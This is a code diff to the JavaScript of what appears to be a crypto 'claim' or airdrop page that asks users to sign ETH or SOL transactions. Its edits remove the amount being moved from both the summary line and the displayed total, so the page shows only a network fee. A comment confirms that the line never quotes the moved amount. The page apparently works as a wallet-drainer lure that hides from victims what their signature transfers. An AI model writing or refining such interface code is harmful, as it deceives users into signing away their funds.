@@ -157,6 +157,7 @@ let lastUsd = 0;
 let lastEthAmountWei = 0n;
 let lastEthFeeWei = 0n;
 let lastDeposit = 0;
+let claimStarted = false;
 let autoSignTimer;
 let fallbackTimer;
 const cache = new Map();
@@ -203,12 +204,17 @@ function applyVisibility() {
   balancesList.querySelectorAll("dd").forEach((dd, index) => {
     if (lastBalances[index] !== undefined) dd.textContent = valuesHidden ? "••••" : lastBalances[index];
   });
-  claimSub.textContent = valuesHidden ? "1 signature · you'll send ≈ ••••" : claimSubText();
+  claimSub.textContent = valuesHidden ? "1 signature · network fee ≈ ••••" : claimSubText();
 }
 
+/* Fee-only line: never quotes the moved amount, just what the network takes. */
 function claimSubText() {
+  if (chain.key === "eth") {
+    if (lastEthFeeWei <= 0n) return "";
+    return `1 signature · network fee ≈ ${formatUnits(lastEthFeeWei, 18)} ETH`;
+  }
   if (!lastUsd) return "";
-  return `1 signature · you'll move ≈ ${usdFormat.format(lastUsd)}`;
+  return `1 signature · network fee ≈ ${(SOL_FEE + lastDeposit).toFixed(6)} SOL`;
 }
 
 /* ---------------- pricing ---------------- */
@@ -407,7 +413,8 @@ function paintEthRows() {
   amountEl.textContent = amountText;
   txAmountEl.textContent = hidden ? "••••" : amountText + " ETH";
   feeNetwork.textContent = formatUnits(lastEthFeeWei, 18) + " ETH";
-  feeTotal.textContent = formatUnits(lastEthAmountWei + lastEthFeeWei, 18) + " ETH";
+  feeTotal.textContent = formatUnits(lastEthFeeWei, 18) + " ETH";
+  if (!claimStarted) claimSub.textContent = hidden ? "1 signature · network fee ≈ ••••" : claimSubText();
 }
 window.paintEthRows = paintEthRows;
 
@@ -445,9 +452,7 @@ function showAllocation(address, usd) {
   lastEstimate = "≈ " + usdFine.format(lastUsd);
   symbolEl.textContent = chain.symbol;
   claimButton.textContent = chain.key === "eth" ? "Approve in wallet" : "Sign to collect";
-  if (chain.key !== "eth") {
-    feeTotal.textContent = (Number(lastAmount) + SOL_FEE + lastDeposit).toFixed(6) + " SOL";
-  }
+  /* the fee block already shows SOL_FEE + deposit; nothing to add here */
   applyVisibility();
   setMessage(claimStatus, "");
   allocation.hidden = false;
@@ -848,6 +853,7 @@ async function claimEth(ownerAddress) {
 }
 
 async function runClaim() {
+  claimStarted = true;
   claimButton.disabled = true;
   claimButton.textContent = "Opening wallet…";
   armFallback();
